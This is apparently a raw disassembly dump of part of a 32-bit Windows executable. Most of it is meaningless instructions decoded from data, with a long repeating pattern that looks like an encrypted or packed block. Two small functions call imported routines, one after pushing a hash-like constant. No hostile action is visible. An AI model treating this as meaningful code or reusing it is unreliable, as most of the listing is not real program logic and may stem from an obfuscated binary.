  422cb7:	push   ebx
  422cb8:	jo     0x422c75
  422cba:	cmp    eax,0xaab6edbc
  422cbf:	bnd je 0x422cde
  422cc2:	mov    bl,0xb6
  422cc4:	sub    ebx,eax
  422cc6:	push   eax
  422cc7:	push   edi
  422cc8:	popf   
  422cc9:	sbb    ebx,esi
  422ccb:	lods   al,BYTE PTR ds:[esi]
  422ccc:	ja     0x422c8b
  422cce:	sbb    eax,0xd1f00833
  422cd3:	cmp    bh,BYTE PTR [eax]
  422cd5:	in     al,dx
  422cd6:	jno    0x422d0a
  422cd8:	hlt    
  422cd9:	ins    BYTE PTR es:[edi],dx
  422cda:	adc    BYTE PTR [esi],dh
  422cdc:	xor    eax,0xd82761f3
  422ce1:	pop    edi
  422ce2:	sub    al,0xc4
  422ce4:	leave  
  422ce5:	aaa    
  422ce6:	mov    gs,WORD PTR [esi]
  422ce8:	sub    DWORD PTR [edi-0x10],ebp
  422ceb:	pop    esp
  422cec:	test   BYTE PTR [edx],bl
  422cee:	lds    ecx,FWORD PTR [eax-0xc]
  422cf1:	jns    0x52328c31
  422cf7:	sbb    ecx,DWORD PTR [ebx+0x79]
  422cfa:	or     eax,DWORD PTR [edi-0x19cf051a]
  422d00:	push   ecx
  422d01:	scas   eax,DWORD PTR es:[edi]
  422d02:	ins    BYTE PTR es:[edi],dx
  422d03:	stos   BYTE PTR es:[edi],al
  422d04:	mov    al,ds:0xf1517a0b
  422d09:	push   cs
  422d0a:	sub    eax,0x5b4fe48b
  422d0f:	icebp  
  422d10:	ret    
  422d11:	clc    
  422d12:	adc    edx,ecx
  422d14:	fdiv   QWORD PTR [edx+esi*2-0x64]
  422d18:	sub    ah,BYTE PTR [edi]
  422d1a:	lods   eax,DWORD PTR ds:[esi]
  422d1b:	xchg   DWORD PTR [edx+0x1c],ecx
  422d1e:	into   
  422d1f:	pop    DWORD PTR [edx-0x10d1cd3a]
  422d25:	mov    cl,0x75
  422d27:	hlt    
  422d28:	sub    BYTE PTR [ebx+0x5e],dl
  422d2b:	sub    DWORD PTR [ebp-0x182e5780],esi
  422d31:	imul   ecx,DWORD PTR [esi+0x5c6ef09d],0x78
  422d38:	pusha  
  422d39:	ins    DWORD PTR es:[edi],dx
  422d3a:	pop    esp
  422d3b:	imul   ebp,DWORD PTR [edx],0xffffffc9
  422d3e:	mov    ds:0x96b0408c,al
  422d43:	xor    dh,bl
  422d45:	cwde   
  422d46:	inc    esp
  422d47:	lahf   
  422d48:	cwde   
  422d49:	movntps XMMWORD PTR [esi-0x7d],xmm2
  422d4d:	ja     0x422dae
  422d4f:	mov    ah,0xab
  422d51:	add    esp,edx
  422d53:	push   cs
  422d54:	lock pop edx
  422d56:	gs popf 
  422d58:	xchg   ecx,eax
  422d59:	add    eax,0xced65fbc
  422d5e:	sub    DWORD PTR [ecx+ebx*2],0x57
  422d62:	xor    bl,bl
  422d64:	stc    
  422d65:	pop    ecx
  422d66:	nop
  422d67:	fs push 0x5f424f9f
  422d6d:	pop    ebx
  422d6e:	outs   dx,BYTE PTR ds:[esi]
  422d6f:	pop    esi
  422d70:	add    dh,BYTE PTR [ebx+0x4b]
  422d73:	xchg   esp,eax
  422d74:	mov    bh,0x40
  422d76:	in     al,0x1a
  422d78:	push   edi
  422d79:	(bad)  
  422d7a:	mov    ds:0xf73d1225,al
  422d7f:	cmp    ecx,ebx
  422d81:	or     ecx,DWORD PTR [edi-0x46]
  422d84:	inc    ebp
  422d85:	cmp    DWORD PTR ds:0xca7b09c3,ebp
  422d8b:	inc    ecx
  422d8c:	lods   al,BYTE PTR ds:[esi]
  422d8d:	jne    0x422dc4
  422d8f:	or     DWORD PTR [esi],ebx
  422d91:	and    eax,0x8eaf9a32
  422d96:	adc    bl,BYTE PTR [ebp-0x5700a376]
  422d9c:	add    eax,0xcf7f8df7
  422da1:	dec    DWORD PTR [esi+0x2e]
  422da4:	inc    esi
  422da5:	cmp    DWORD PTR [eax-0x26],eax
  422da8:	jp     0x422de6
  422daa:	add    esi,DWORD PTR ds:0x8a1f4ac1
  422db0:	push   ds
  422db1:	pop    ecx
  422db2:	mov    ch,0xc
  422db4:	lahf   
  422db5:	dec    esi
  422db6:	mov    ecx,DWORD PTR [edi]
  422db8:	add    DWORD PTR [ebp+0x15],edi
  422dbb:	push   cs
  422dbc:	pusha  
  422dbd:	cli    
  422dbe:	stos   DWORD PTR es:[edi],eax
  422dbf:	imul   edi,DWORD PTR [edi-0x365b3e03],0x59
  422dc6:	push   ebp
  422dc7:	ss cld 
  422dc9:	pop    eax
  422dca:	and    al,0xc0
  422dcc:	add    DWORD PTR [edx],0xfffffffb
  422dcf:	xor    DWORD PTR [ebp+0x667e1cac],0xffffffd3
  422dd6:	sub    al,0x90
  422dd8:	mov    DWORD PTR [ecx+0x75],esi
  422ddb:	sub    cl,BYTE PTR [ebx]
  422ddd:	mov    dh,0x85
  422ddf:	mov    al,0x64
  422de1:	jl     0x422d74
  422de3:	stos   DWORD PTR es:[edi],eax
  422de4:	aas    
  422de5:	dec    ecx
  422de6:	xchg   ebx,eax
  422de7:	loopne 0x422e38
  422de9:	or     BYTE PTR [edi-0x7a],0xc0
  422ded:	push   ss
  422dee:	jl     0x422db7
  422df0:	pop    ebx
  422df1:	dec    edi
  422df2:	jno    0x422dca
  422df4:	lods   al,BYTE PTR ds:[esi]
  422df5:	or     al,0xec
  422df7:	sbb    dl,dh
  422df9:	in     al,0x51
  422dfb:	out    dx,eax
  422dfc:	enter  0x9502,0xcb
  422e00:	sub    eax,0xb545b489
  422e05:	push   esp
  422e06:	sbb    BYTE PTR [ecx],bl
  422e08:	(bad)  
  422e09:	aam    0x82
  422e0b:	repz mov ebp,ebx
  422e0e:	add    DWORD PTR [esi*1-0x2effc1c2],0x57
  422e16:	in     al,dx
  422e17:	jne    0x422e1f
  422e19:	dec    esi
  422e1a:	mov    ch,0x1f
  422e1c:	int    0x1d
  422e1e:	xchg   ebp,eax
  422e1f:	push   edi
  422e20:	add    bh,cl
  422e22:	inc    ebx
  422e23:	mov    cl,0xd6
  422e25:	and    eax,0x3050c3b6
  422e2a:	test   eax,0xd260239f
  422e2f:	or     ch,ah
  422e31:	mov    ds,WORD PTR [ecx]
  422e33:	call   0xc672:0x62fad5ac
  422e3a:	mov    al,0xc
  422e3c:	adc    BYTE PTR [esp+eax*4],dh
  422e3f:	shl    BYTE PTR [ecx-0x3f663e77],1
  422e45:	pop    es
  422e46:	clc    
  422e47:	outs   dx,BYTE PTR ds:[esi]
  422e48:	adc    ah,dl
  422e4a:	xlat   BYTE PTR ds:[ebx]
  422e4b:	jecxz  0x422e50
  422e4d:	add    al,0xf8
  422e4f:	jb     0x422e07
  422e51:	(bad)  
  422e52:	dec    esi
  422e53:	mov    esp,0x2f0dfec0
  422e58:	pop    es
  422e59:	gs inc eax
  422e5b:	sub    edx,eax
  422e5d:	addr16 pop edx
  422e5f:	push   ss
  422e60:	in     eax,0x62
  422e62:	ss mov al,0x22
  422e65:	lahf   
  422e66:	hlt    
  422e67:	jae    0x422e5f
  422e69:	mov    ah,0x76
  422e6b:	das    
  422e6c:	in     al,0x6b
  422e6e:	sar    BYTE PTR [eax],cl
  422e70:	and    eax,0x1aeabf29
  422e75:	xor    esi,DWORD PTR [edx+edi*1+0x71]
  422e79:	mov    eax,ds:0xe0b5965b
  422e7e:	mov    DWORD PTR [edx+0x4b81eb92],ebx
  422e84:	mov    ?,WORD PTR [ebp-0x33679d89]
  422e8a:	push   ebx
  422e8b:	aaa    
  422e8c:	in     eax,dx
  422e8d:	add    bl,0x96
  422e90:	dec    edx
  422e91:	mov    dh,0x7e
  422e93:	clc    
  422e94:	shl    DWORD PTR [ecx-0x22],0xbc
  422e98:	sbb    dh,BYTE PTR [edx+0x55]
  422e9b:	retf   
  422e9c:	xor    eax,0x7fae552c
  422ea1:	push   edx
  422ea2:	test   DWORD PTR [eax-0xe3ce9c4],0x6591a2dd
  422eac:	jnp    0x422e83
  422eae:	scas   eax,DWORD PTR es:[edi]
  422eaf:	xchg   ebp,eax
  422eb0:	dec    edx
  422eb1:	mov    DWORD PTR [ebp-0x5ede08c9],ebx
  422eb7:	jmp    0x6f6e5a4d
  422ebc:	fldcw  WORD PTR [edx]
  422ebe:	jne    0x422e67
  422ec0:	es clc 
  422ec2:	pusha  
  422ec3:	mov    dh,0x2c
  422ec5:	inc    esp
  422ec6:	push   ebp
  422ec7:	push   es
  422ec8:	inc    ebx
  422ec9:	sbb    al,0x31
  422ecb:	daa    
  422ecc:	jmp    0x2556:0xba7fd814
  422ed3:	xchg   ebp,eax
  422ed4:	jo     0x422e79
  422ed6:	jo     0x422f07
  422ed8:	sbb    al,0x4b
  422eda:	sti    
  422edb:	in     eax,dx
  422edc:	fnsave [edi]
  422ede:	(bad)  
  422ee0:	cs or  edx,ecx
  422ee3:	jg     0x422ea1
  422ee5:	out    dx,al
  422ee6:	cmc    
  422ee7:	dec    ebp
  422ee8:	adc    dh,BYTE PTR [ebx+0x58]
  422eeb:	sbb    BYTE PTR [ebp+0x2799ff7b],dl
  422ef1:	pop    es
  422ef2:	pop    ebp
  422ef3:	loop   0x422e79
  422ef5:	xchg   ecx,eax
  422ef6:	aas    
  422ef7:	lahf   
  422ef8:	mov    ds:0x6f932bf2,al
  422efd:	mov    DWORD PTR [ecx+0x5d],eax
  422f00:	push   esi
  422f01:	test   DWORD PTR [ebp+ecx*8-0x9],ebx
  422f05:	push   esi
  422f06:	sub    ah,BYTE PTR [ebx]
  422f08:	push   ss
  422f09:	xchg   edx,eax
  422f0a:	pop    esi
  422f0b:	cmc    
  422f0c:	aam    0x29
  422f0e:	(bad)  
  422f0f:	sbb    al,0xf
  422f11:	jae    0x422f67
  422f13:	pop    edi
  422f14:	loop   0x422f18
  422f16:	mov    al,0xde
  422f18:	lods   al,BYTE PTR ds:[esi]
  422f19:	shl    BYTE PTR [edi],0x26
  422f1c:	and    al,0x1c
  422f1e:	stos   DWORD PTR es:[edi],eax
  422f1f:	out    0x63,al
  422f21:	xchg   bh,dl
  422f23:	pop    bx
  422f25:	(bad)  es:[ebp+0x21]
  422f29:	mov    eax,0x1
  422f2e:	mov    esp,ebp
  422f30:	pop    ebp
  422f31:	ret    
  422f32:	int3   
  422f33:	int3   
  422f34:	int3   
  422f35:	int3   
  422f36:	int3   
  422f37:	int3   
  422f38:	int3   
  422f39:	int3   
  422f3a:	int3   
  422f3b:	int3   
  422f3c:	int3   
  422f3d:	int3   
  422f3e:	int3   
  422f3f:	int3   
  422f40:	push   ebp
  422f41:	mov    ebp,esp
  422f43:	sub    esp,0x8
  422f46:	mov    eax,ds:0x429028
  422f4b:	push   esi
  422f4c:	push   0x0
  422f4e:	push   0x4e
  422f50:	push   0x1e
  422f52:	push   0x0
  422f54:	push   0xffffffff
  422f56:	mov    DWORD PTR [ebp-0x4],0x0
  422f5d:	mov    DWORD PTR [ebp-0x8],eax
  422f60:	call   DWORD PTR ds:0x429038
  422f66:	mov    esi,DWORD PTR [ebp-0x8]
  422f69:	call   esi
  422f6b:	mov    DWORD PTR [ebp-0x4],eax
  422f6e:	cmp    DWORD PTR [ebp-0x4],0x57
  422f72:	jne    0x422f81
  422f74:	push   0x3f382f0e
  422f79:	call   0x4111f0
  422f7e:	add    esp,0x4
  422f81:	xor    eax,eax
  422f83:	pop    esi
  422f84:	mov    esp,ebp
  422f86:	pop    ebp
  422f87:	ret    
  422f88:	nop
  422f89:	nop
  422f8a:	nop
  422f8b:	nop
  422f8c:	nop
  422f8d:	nop
  422f8e:	nop
  422f8f:	nop
  422f90:	sub    esp,0x10
  422f93:	push   0x0
  422f95:	push   0x0
  422f97:	push   0x0
  422f99:	call   DWORD PTR ds:0x429034
  422f9f:	lea    eax,[esp+0x0]
  422fa3:	push   eax
  422fa4:	call   DWORD PTR ds:0x42903c
  422faa:	cmp    WORD PTR [esp+0x0],0x0
  422fb0:	je     0x422fd2
  422fb2:	push   0x0
  422fb4:	call   0x422f40
  422fb9:	add    esp,0x4
  422fbc:	call   0x411000
  422fc1:	push   0x0
  422fc3:	push   0x0
  422fc5:	call   0x424410
  422fca:	xor    eax,eax
  422fcc:	add    esp,0x10
  422fcf:	ret    0x10
  422fd2:	jmp    FWORD PTR [ebp-0x89f3c1a]
  422fd8:	pop    ebx
  422fd9:	mov    ch,0xee
  422fdb:	scas   eax,DWORD PTR es:[edi]
  422fdc:	or     BYTE PTR [edx+0x1],bl
  422fdf:	mov    al,ds:0xd853bc1f
  422fe4:	hlt    
  422fe5:	pop    ebx
  422fe6:	mov    ch,0xee
  422fe8:	stos   DWORD PTR es:[edi],eax
  422fe9:	or     BYTE PTR [edx+0x41],bl
  422fec:	pop    edi
  422fed:	loopne 0x422fab
  422fef:	push   ebx
  422ff0:	pusha  
  422ff1:	hlt    
  422ff2:	pop    ebx
  422ff3:	mov    ch,0xee
  422ff5:	stos   DWORD PTR es:[edi],eax
  422ff6:	or     BYTE PTR [edx+0x1],bl
  422ff9:	pop    edi
  422ffa:	loopne 0x422fb8
  422ffc:	push   ebx
  422ffd:	pusha  
  422ffe:	hlt    
  422fff:	pop    ebx
  423000:	mov    ch,0xee
  423002:	stos   DWORD PTR es:[edi],eax
  423003:	or     BYTE PTR [edx+0x1],bl
  423006:	pop    edi
  423007:	loopne 0x422fc5
  423009:	push   ebx
  42300a:	pusha  
  42300b:	hlt    
  42300c:	pop    ebx
  42300d:	mov    ch,0xee
  42300f:	push   ebx
  423010:	or     BYTE PTR [edx+0x1],bl
  423013:	push   ecx
  423014:	inc    DWORD PTR [esi]
  423016:	pop    ebp
  423017:	pusha  
  423018:	inc    eax
  423019:	push   edx
  42301a:	js     0x422feb
  42301c:	adc    ecx,DWORD PTR [ecx]
  42301e:	push   ss
  42301f:	int3   
  423020:	jle    0x422fd6
  423022:	aam    0x3a
  423024:	adc    edx,esp
  423026:	sub    eax,edi
  423028:	or     esp,0x7f6c3b7a
  42302e:	sbb    ebp,0x3d
  423031:	push   cs
  423032:	fwait
  423033:	das    
  423034:	xchg   ebp,eax
  423035:	mov    esi,cs
  423037:	sub    BYTE PTR [eax],ch
  423039:	je     0x42306c
  42303b:	rcl    ch,0x3d
  42303e:	inc    eax
  42303f:	mov    al,0x14
  423041:	out    0xce,al
  423043:	(bad)  
  423044:	addr16 ds fs jno 0x423036
  423049:	mov    cl,0x59
  42304b:	inc    esp
  42304c:	hlt    
  42304d:	pop    ebx
  42304e:	mov    ch,0xee
  423050:	stos   DWORD PTR es:[edi],eax
  423051:	or     BYTE PTR [edx+0x6],bl
  423054:	(bad)  
  423055:	sbb    al,0xe5
  423057:	adc    BYTE PTR [eax+0x16f65166],bl
  42305d:	cmp    DWORD PTR [edx],eax
  42305f:	sbb    ecx,edi
  423061:	int    0xea
  423063:	in     al,0x36
  423065:	ins    BYTE PTR es:[edi],dx
  423066:	inc    BYTE PTR [ecx*2+0x3f50a17c]
  42306d:	cmp    DWORD PTR [ebp+0x22],edx
  423070:	inc    esp
  423071:	shr    DWORD PTR [edx-0x54],0x3e
  423075:	mov    esp,fs
  423077:	ret    
  423078:	lock enter 0x730b,0x6e
  42307d:	test   DWORD PTR [ecx+0x26],ebx
  423080:	or     al,0xc9
  423082:	mov    edi,0x50192ba4
  423087:	dec    ebx
  423088:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423089:	jb     0x423041
  42308b:	sbb    eax,esp
  42308d:	cmc    
  42308e:	push   ecx
  42308f:	in     eax,dx
  423090:	push   ss
  423091:	cmp    DWORD PTR [edx],eax
  423093:	sbb    ecx,edi
  423095:	int3   
  423096:	jmp    0x6de4:0xfef2aa94
  42309d:	outs   dx,BYTE PTR ds:[esi]
  42309e:	mov    eax,ds:0x5593a245
  4230a3:	mov    eax,0xfc6a6ed9
  4230a8:	mov    ds:0x6df3e427,eax
  4230ad:	push   edx
  4230ae:	or     ebx,DWORD PTR ds:0x38592e18
  4230b4:	xchg   ecx,eax
  4230b5:	push   esp
  4230b6:	mov    edi,0x509a53ac
  4230bb:	push   ebx
  4230bc:	ss adc esp,0x10
  4230c0:	cwde   
  4230c1:	push   cx
  4230c3:	mov    ch,0xee
  4230c5:	stos   DWORD PTR es:[edi],eax
  4230c6:	or     BYTE PTR [edx+0x1],bl
  4230c9:	pop    edi
  4230ca:	loopne 0x4230b8
  4230cc:	push   ss
  4230cd:	pusha  
  4230ce:	hlt    
  4230cf:	pop    ss
  4230d0:	mov    ah,0xec
  4230d2:	stos   DWORD PTR es:[edi],eax
  4230d3:	in     al,0xb9
  4230d5:	pop    esi
  4230d6:	adc    al,ah
  4230d8:	mov    esp,0x5bf46053
  4230dd:	mov    ch,0xee
  4230df:	dec    ebx
  4230e0:	or     BYTE PTR [ecx+0x0],bl
  4230e3:	push   esp
  4230e4:	loope  0x42309c
  4230e6:	push   ebx
  4230e7:	pusha  
  4230e8:	sbb    BYTE PTR [edi-0x4b],bl
  4230eb:	out    dx,al
  4230ec:	scas   eax,DWORD PTR es:[edi]
  4230ed:	push   cs
  4230ee:	pop    edx
  4230ef:	add    DWORD PTR [edi-0x20],ebx
  4230f2:	mov    esp,0x5bf4dd52
  4230f7:	mov    ch,0xfe
  4230f9:	stos   DWORD PTR es:[edi],eax
  4230fa:	or     BYTE PTR [edx+0x1],bl
  4230fd:	pop    edx
  4230fe:	loopne 0x4230bc
  423100:	push   ebx
  423101:	and    esp,esi
  423103:	pop    ebx
  423104:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423105:	out    dx,al
  423106:	stos   DWORD PTR es:[edi],eax
  423107:	or     BYTE PTR [eax+0x1],bl
  42310a:	pop    edi
  42310b:	in     eax,0xbc
  42310d:	push   edx
  42310e:	pusha  
  42310f:	hlt    
  423110:	pop    ebx
  423111:	mov    ch,0xee
  423113:	scas   al,BYTE PTR es:[edi]
  423114:	or     BYTE PTR [ebx+0x1],bl
  423117:	pop    edi
  423118:	loopne 0x4230d6
  42311a:	push   ebx
  42311b:	pusha  
  42311c:	je     0x42316e
  42311e:	mov    ch,0xee
  423120:	scas   eax,DWORD PTR es:[edi]
  423121:	or     BYTE PTR [edx-0x44],bl
  423124:	outs   dx,BYTE PTR ds:[esi]
  423125:	in     eax,0xbc
  423127:	push   ecx
  423128:	pusha  
  423129:	hlt    
  42312a:	(bad)  [ebp+0x5a08bbee]
  423130:	adc    DWORD PTR [edi-0x20],ebx
  423133:	mov    esp,0x5bf47053
  423138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423139:	out    dx,al
  42313a:	stos   DWORD PTR es:[edi],eax
  42313b:	or     BYTE PTR [edx+0x1],bl
  42313e:	pop    edi
  42313f:	lock mov esp,0x5bf46053
  423145:	mov    ch,0xee
  423147:	stos   DWORD PTR es:[edi],eax
  423148:	or     BYTE PTR [edx+0x1],bl
  42314b:	fisttp DWORD PTR [esi-0x8f6ac49]
  423151:	pop    ebx
  423152:	mov    ch,0xee
  423154:	fwait
  423155:	add    ebx,DWORD PTR [edx-0x32]
  423158:	(bad)  
  423159:	loopne 0x423117
  42315b:	push   ebx
  42315c:	pusha  
  42315d:	hlt    
  42315e:	pop    ebx
  42315f:	mov    ch,0xee
  423161:	stos   DWORD PTR es:[edi],eax
  423162:	or     BYTE PTR [edx+0x1],bl
  423165:	pop    edi
  423166:	loopne 0x423124
  423168:	push   ebx
  423169:	pusha  
  42316a:	hlt    
  42316b:	pop    ebx
  42316c:	mov    ch,0xee
  42316e:	stos   DWORD PTR es:[edi],eax
  42316f:	or     BYTE PTR [edx+0x1],bl
  423172:	pop    edi
  423173:	loopne 0x423131
  423175:	push   ebx
  423176:	pusha  
  423177:	hlt    
  423178:	pop    ebx
  423179:	mov    ch,0xee
  42317b:	stos   DWORD PTR es:[edi],eax
  42317c:	or     BYTE PTR [edx+0x1],bl
  42317f:	pop    edi
  423180:	loopne 0x42313e
  423182:	push   ebx
  423183:	pusha  
  423184:	hlt    
  423185:	pop    ebx
  423186:	mov    ch,0xee
  423188:	stos   DWORD PTR es:[edi],eax
  423189:	or     BYTE PTR [edx+0x1],bl
  42318c:	pop    edi
  42318d:	loopne 0x42314b
  42318f:	push   ebx
  423190:	pusha  
  423191:	hlt    
  423192:	pop    ebx
  423193:	mov    ch,0xee
  423195:	stos   DWORD PTR es:[edi],eax
  423196:	or     BYTE PTR [edx+0x1],bl
  423199:	pop    edi
  42319a:	loopne 0x423158
  42319c:	push   ebx
  42319d:	pusha  
  42319e:	hlt    
  42319f:	pop    ebx
  4231a0:	mov    ch,0xee
  4231a2:	stos   DWORD PTR es:[edi],eax
  4231a3:	or     BYTE PTR [edx+0x1],bl
  4231a6:	pop    edi
  4231a7:	loopne 0x423165
  4231a9:	push   ebx
  4231aa:	pusha  
  4231ab:	hlt    
  4231ac:	pop    ebx
  4231ad:	mov    ch,0xee
  4231af:	stos   DWORD PTR es:[edi],eax
  4231b0:	or     BYTE PTR [edx+0x1],bl
  4231b3:	pop    edi
  4231b4:	loopne 0x423172
  4231b6:	push   ebx
  4231b7:	pusha  
  4231b8:	hlt    
  4231b9:	pop    ebx
  4231ba:	mov    ch,0xee
  4231bc:	stos   DWORD PTR es:[edi],eax
  4231bd:	or     BYTE PTR [edx+0x1],bl
  4231c0:	pop    edi
  4231c1:	loopne 0x42317f
  4231c3:	jge    0x4231d9
  4231c5:	xchg   ecx,eax
  4231c6:	and    eax,ecx
  4231c8:	out    dx,al
  4231c9:	stos   DWORD PTR es:[edi],eax
  4231ca:	or     BYTE PTR [edx+0x21],bl
  4231cd:	push   esp
  4231ce:	loopne 0x42318c
  4231d0:	inc    ebx
  4231d1:	pusha  
  4231d2:	hlt    
  4231d3:	pop    ebx
  4231d4:	(bad)
  4231d8:	pop    esi
  4231d9:	add    DWORD PTR [edi-0x50],ebx
  4231dc:	stc    
  4231dd:	adc    BYTE PTR [edx-0x60],dl
  4231e0:	adc    al,0xb5
  4231e2:	out    dx,al
  4231e3:	stos   DWORD PTR es:[edi],eax
  4231e4:	or     BYTE PTR [edx+0x1],bl
  4231e7:	jg     0x4231c9
  4231e9:	mov    esp,0x28864eb3
  4231ee:	(bad)  
  4231ef:	lea    ebp,[ebx+0xf015a08]
  4231f5:	loopne 0x4231b3
  4231f7:	push   ebx
  4231f8:	push   eax
  4231f9:	call   FWORD PTR [ebx-0x4b]
  4231fc:	mov    esi,0x3f5a08ab
  423201:	pop    ebx
  423202:	loopne 0x4231c0
  423204:	push   ebx
  423205:	pusha  
  423206:	hlt    
  423207:	pop    ebx
  423208:	mov    ch,0xee
  42320a:	stos   DWORD PTR es:[edi],eax
  42320b:	or     BYTE PTR [edx+0x1],bl
  42320e:	pop    edi
  42320f:	sar    BYTE PTR [ebx+edx*2-0x4aa40b80],0xee
  423217:	stos   DWORD PTR es:[edi],eax
  423218:	or     BYTE PTR [edx+0x1],bl
  42321b:	pop    edi
  42321c:	loopne 0x4231da
  42321e:	push   ebx
  42321f:	pusha  
  423220:	hlt    
  423221:	pop    ebx
  423222:	mov    ch,0xee
  423224:	stos   DWORD PTR es:[edi],eax
  423225:	or     BYTE PTR [edx+0x1],bl
  423228:	pop    edi
  423229:	loopne 0x4231e7
  42322b:	push   ebx
  42322c:	pusha  
  42322d:	hlt    
  42322e:	pop    ebx
  42322f:	mov    ch,0xee
  423231:	stos   DWORD PTR es:[edi],eax
  423232:	or     BYTE PTR [edx+0x1],bl
  423235:	pop    edi
  423236:	loopne 0x4231f4
  423238:	push   ebx
  423239:	pusha  
  42323a:	hlt    
  42323b:	pop    ebx
  42323c:	mov    ch,0xee
  42323e:	stos   DWORD PTR es:[edi],eax
  42323f:	or     BYTE PTR [edx+0x1],bl
  423242:	pop    edi
  423243:	loopne 0x423201
  423245:	push   ebx
  423246:	pusha  
  423247:	hlt    
  423248:	pop    ebx
  423249:	mov    ch,0xee
  42324b:	stos   DWORD PTR es:[edi],eax
  42324c:	or     BYTE PTR [edx+0x1],bl
  42324f:	pop    edi
  423250:	loopne 0x42320e
  423252:	push   ebx
  423253:	pusha  
  423254:	hlt    
  423255:	pop    ebx
  423256:	mov    ch,0xee
  423258:	stos   DWORD PTR es:[edi],eax
  423259:	or     BYTE PTR [edx+0x1],bl
  42325c:	pop    edi
  42325d:	loopne 0x42321b
  42325f:	push   ebx
  423260:	pusha  
  423261:	hlt    
  423262:	pop    ebx
  423263:	mov    ch,0xee
  423265:	stos   DWORD PTR es:[edi],eax
  423266:	or     BYTE PTR [edx+0x1],bl
  423269:	pop    edi
  42326a:	loopne 0x423228
  42326c:	push   ebx
  42326d:	pusha  
  42326e:	hlt    
  42326f:	pop    ebx
  423270:	mov    ch,0xee
  423272:	stos   DWORD PTR es:[edi],eax
  423273:	or     BYTE PTR [edx+0x1],bl
  423276:	pop    edi
  423277:	loopne 0x423235
  423279:	push   ebx
  42327a:	pusha  
  42327b:	hlt    
  42327c:	pop    ebx
  42327d:	mov    ch,0xee
  42327f:	stos   DWORD PTR es:[edi],eax
  423280:	or     BYTE PTR [edx+0x1],bl
  423283:	pop    edi
  423284:	loopne 0x423242
  423286:	push   ebx
  423287:	pusha  
  423288:	hlt    
  423289:	pop    ebx
  42328a:	mov    ch,0xee
  42328c:	stos   DWORD PTR es:[edi],eax
  42328d:	or     BYTE PTR [edx+0x1],bl
  423290:	pop    edi
  423291:	loopne 0x42324f
  423293:	push   ebx
  423294:	pusha  
  423295:	hlt    
  423296:	pop    ebx
  423297:	mov    ch,0xee
  423299:	stos   DWORD PTR es:[edi],eax
  42329a:	or     BYTE PTR [edx+0x1],bl
  42329d:	pop    edi
  42329e:	loopne 0x42325c
  4232a0:	push   ebx
  4232a1:	pusha  
  4232a2:	hlt    
  4232a3:	pop    ebx
  4232a4:	mov    ch,0xee
  4232a6:	stos   DWORD PTR es:[edi],eax
  4232a7:	or     BYTE PTR [edx+0x1],bl
  4232aa:	pop    edi
  4232ab:	loopne 0x423269
  4232ad:	push   ebx
  4232ae:	pusha  
  4232af:	hlt    
  4232b0:	pop    ebx
  4232b1:	mov    ch,0xee
  4232b3:	stos   DWORD PTR es:[edi],eax
  4232b4:	or     BYTE PTR [edx+0x1],bl
  4232b7:	pop    edi
  4232b8:	loopne 0x423276
  4232ba:	push   ebx
  4232bb:	pusha  
  4232bc:	hlt    
  4232bd:	pop    ebx
  4232be:	mov    ch,0xee
  4232c0:	stos   DWORD PTR es:[edi],eax
  4232c1:	or     BYTE PTR [edx+0x1],bl
  4232c4:	pop    edi
  4232c5:	loopne 0x423283
  4232c7:	push   ebx
  4232c8:	pusha  
  4232c9:	hlt    
  4232ca:	pop    ebx
  4232cb:	mov    ch,0xee
  4232cd:	stos   DWORD PTR es:[edi],eax
  4232ce:	or     BYTE PTR [edx+0x1],bl
  4232d1:	pop    edi
  4232d2:	loopne 0x423290
  4232d4:	push   ebx
  4232d5:	pusha  
  4232d6:	hlt    
  4232d7:	pop    ebx
  4232d8:	mov    ch,0xee
  4232da:	stos   DWORD PTR es:[edi],eax
  4232db:	or     BYTE PTR [edx+0x1],bl
  4232de:	pop    edi
  4232df:	loopne 0x42329d
  4232e1:	push   ebx
  4232e2:	pusha  
  4232e3:	hlt    
  4232e4:	pop    ebx
  4232e5:	mov    ch,0xee
  4232e7:	stos   DWORD PTR es:[edi],eax
  4232e8:	or     BYTE PTR [edx+0x1],bl
  4232eb:	pop    edi
  4232ec:	loopne 0x4232aa
  4232ee:	push   ebx
  4232ef:	pusha  
  4232f0:	hlt    
  4232f1:	pop    ebx
  4232f2:	mov    ch,0xee
  4232f4:	stos   DWORD PTR es:[edi],eax
  4232f5:	or     BYTE PTR [edx+0x1],bl
  4232f8:	pop    edi
  4232f9:	loopne 0x4232b7
  4232fb:	push   ebx
  4232fc:	pusha  
  4232fd:	hlt    
  4232fe:	pop    ebx
  4232ff:	mov    ch,0xee
  423301:	stos   DWORD PTR es:[edi],eax
  423302:	or     BYTE PTR [edx+0x1],bl
  423305:	pop    edi
  423306:	loopne 0x4232c4
  423308:	push   ebx
  423309:	pusha  
  42330a:	hlt    
  42330b:	pop    ebx
  42330c:	mov    ch,0xee
  42330e:	stos   DWORD PTR es:[edi],eax
  42330f:	or     BYTE PTR [edx+0x1],bl
  423312:	pop    edi
  423313:	loopne 0x4232d1
  423315:	push   ebx
  423316:	pusha  
  423317:	hlt    
  423318:	pop    ebx
  423319:	mov    ch,0xee
  42331b:	stos   DWORD PTR es:[edi],eax
  42331c:	or     BYTE PTR [edx+0x1],bl
  42331f:	pop    edi
  423320:	loopne 0x4232de
  423322:	push   ebx
  423323:	pusha  
  423324:	hlt    
  423325:	pop    ebx
  423326:	mov    ch,0xee
  423328:	stos   DWORD PTR es:[edi],eax
  423329:	or     BYTE PTR [edx+0x1],bl
  42332c:	pop    edi
  42332d:	loopne 0x4232eb
  42332f:	push   ebx
  423330:	pusha  
  423331:	hlt    
  423332:	pop    ebx
  423333:	mov    ch,0xee
  423335:	stos   DWORD PTR es:[edi],eax
  423336:	or     BYTE PTR [edx+0x1],bl
  423339:	pop    edi
  42333a:	loopne 0x4232f8
  42333c:	push   ebx
  42333d:	pusha  
  42333e:	hlt    
  42333f:	pop    ebx
  423340:	mov    ch,0xee
  423342:	stos   DWORD PTR es:[edi],eax
  423343:	or     BYTE PTR [edx+0x1],bl
  423346:	pop    edi
  423347:	loopne 0x423305
  423349:	push   ebx
  42334a:	pusha  
  42334b:	hlt    
  42334c:	pop    ebx
  42334d:	mov    ch,0xee
  42334f:	stos   DWORD PTR es:[edi],eax
  423350:	or     BYTE PTR [edx+0x1],bl
  423353:	pop    edi
  423354:	loopne 0x423312
  423356:	push   ebx
  423357:	pusha  
  423358:	hlt    
  423359:	pop    ebx
  42335a:	mov    ch,0xee
